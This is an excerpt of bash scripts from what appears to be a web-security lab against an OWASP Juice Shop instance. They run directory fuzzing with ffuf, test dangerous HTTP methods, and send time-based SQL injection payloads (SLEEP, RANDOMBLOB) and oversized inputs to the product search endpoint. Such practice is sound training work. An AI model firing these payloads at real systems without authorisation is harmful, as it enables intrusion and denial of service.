...
hits=0
for p in "${PATHS[@]}"; do
  read code size < <(curl -s -o /dev/null -w "%{http_code} %{size_download}" -m 3 "http://juice.6v6.lab/$p")
...
> ffuf -u http://juice.6v6.lab/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -mc 200,301,302,403 -fs 89
> ```
...
curl -sI -X OPTIONS http://juice.6v6.lab/ | grep -iE "allow|access-control" | sed 's/^/  /'
echo "---"

printf "%-12s %-8s %s\n" "method" "code" "verdict"
for method in PUT DELETE TRACE CONNECT PATCH; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X $method http://juice.6v6.lab/)
  v=""
  case "$code" in
    200|204) v="★ 허용 (위험)";;
...
for payload in "${PAYLOADS[@]}"; do
  ...
  read code time < <(curl -s -o /tmp/sqli.json -w "%{http_code} %{time_total}" "http://juice.6v6.lab/rest/products/search?q=${enc}")
...
measure_time "정상 (q=apple)"          "http://juice.6v6.lab/rest/products/search?q=apple"
measure_time "SLEEP(3) MySQL 페이로드"  "http://juice.6v6.lab/rest/products/search?q=apple'+AND+SLEEP(3)--"
measure_time "SQLite RANDOMBLOB 100MB"  "http://juice.6v6.lab/rest/products/search?q=test%27%29%29AND+%28SELECT+CASE+WHEN%281%3D1%29+THEN+RANDOMBLOB%28100000000%29+ELSE+1+END%29--"
measure_time "긴 입력 (10K char)"        "http://juice.6v6.lab/rest/products/search?q=$(python3 -c 'print(\"A\"*10000)')"
```
